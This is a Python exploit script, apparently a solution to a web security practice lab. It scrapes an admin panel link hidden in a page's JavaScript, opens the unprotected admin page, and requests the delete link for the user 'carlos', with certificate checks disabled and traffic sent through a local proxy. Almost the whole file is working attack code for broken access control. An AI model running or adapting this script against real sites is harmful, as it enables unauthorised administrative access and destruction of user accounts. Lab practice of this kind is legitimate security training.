import requests
import sys
import re
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"http://127.0.0.1:8087", "https":"http://127.0.0.1:8087"}

def broken_authentification_exploit(session, url) :
    
    r = session.get(url, verify=False, proxies=proxies)

    # Use a regular expression to find the link in the JavaScript code
    pattern = r".setAttribute\('href', '(.*?)'\)"
    match = re.search(pattern, r.text)

    if match:
        link_in_js = match.group(1)

        if link_in_js:
            print("Admin Panel Link:", link_in_js)
            print(link_in_js)
            
            admin_url = url + link_in_js
            r = session.get(admin_url, verify=False, proxies=proxies)
            
            if "carlos" in r.text :
                print("(+) Successfully access to the admin panel page.")
                
                pattern = r'<a href="(/admin-.*carlos)">'
                match = re.search(pattern, r.text)
                delete_url = url + match.group(1)
                r = session.get(delete_url, verify=False, proxies=proxies)
                
                if "User deleted successfully!" in r.text :
                    print("(+) The carlos user has been successfully deleted.")
                else :
                    print("(-) Failed to delete the carlos user.")
            else :
                print("(-) Could not access to the admin panel page.")
        else:
            print("(-) Admin panel link not found.")
    else:
        print("(-) Link in JavaScript not found.")
    
        
            
if __name__ == "__main__" :
    try :
        url = sys.argv[1].strip()
    except IndexError :
        print("(+) Usage : %s <url>" % sys.argv[0])
        print("(+) Example : %s www.example.com" % sys.argv[0])
        sys.exit(-1)
        
    session = requests.Session()
    broken_authentification_exploit(session, url)